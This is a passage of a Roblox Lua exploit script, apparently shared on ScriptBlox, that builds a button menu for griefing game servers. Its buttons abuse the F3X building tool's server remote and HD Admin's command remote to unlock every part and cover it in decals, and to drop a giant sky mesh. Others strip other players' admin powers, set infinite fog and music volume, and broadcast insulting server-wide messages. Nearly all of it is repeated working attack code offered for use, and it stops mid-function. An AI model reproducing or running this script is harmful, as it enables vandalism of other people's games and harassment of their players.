		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("8408806737")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("8408806737")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.52, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "anti-skid"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";hideGuis others")
	RequestCommand:InvokeServer(";unfly others")
	RequestCommand:InvokeServer(";unfly2 others")
	RequestCommand:InvokeServer(";unnoclip others")
	RequestCommand:InvokeServer(";unnoclip2 others")
	RequestCommand:InvokeServer(";uncmdbar2 others")
	RequestCommand:InvokeServer(";uncmdbar others")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.52, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "k**pkidd skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("9422866248")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.52, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "k**pkidd decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("8599330683")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.52, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "disco fog"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";disco")
	RequestCommand:InvokeServer(";fog inf")
	RequestCommand:InvokeServer(";fog -inf")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.52, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "MLGGGGG"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 18
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 7297996191")
	RequestCommand:InvokeServer(";volume inf")
	task.wait(1.10)
	RequestCommand:InvokeServer(";music 86372122769578")
    RequestCommand:InvokeServer(";pitch 1")
	RequestCommand:InvokeServer(";volume inf")
    task.wait(1)
	RequestCommand:InvokeServer(";disco")
	RequestCommand:InvokeServer(";fog 100 100")
	RequestCommand:InvokeServer(";serverMessage pwenED stupid idiot kid fix your game")
	task.wait(2)
	RequestCommand:InvokeServer(";serverMessage EZZZZZZZZZZZZZZZZZZZZZ MLG RULE IDIOTS")
	task.wait(4)
	RequestCommand:InvokeServer(";serverMessage ILLUMINATI COMFERMID")
	task.wait(2)
	RequestCommand:InvokeServer(";serverMessage  ILLUMINATI OUT SUCKAA")
end)
f3x.MouseButton1Click:Connect(function()
	task.wait(1)
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("73641250842315")

	-----------------------------------

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("73641250842315")

	-----------
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	-- DO NOT DELETE THIS LEAVE MY CREDIT

	-- Rain Toad Script By ItsKittyyyGD 

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end

	function SetAnchor(boolean, part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function CreatePart(cf)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = workspace
		}
		_(args)
	end

	function Resize(part, size, cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://" .. texid
				}
			}
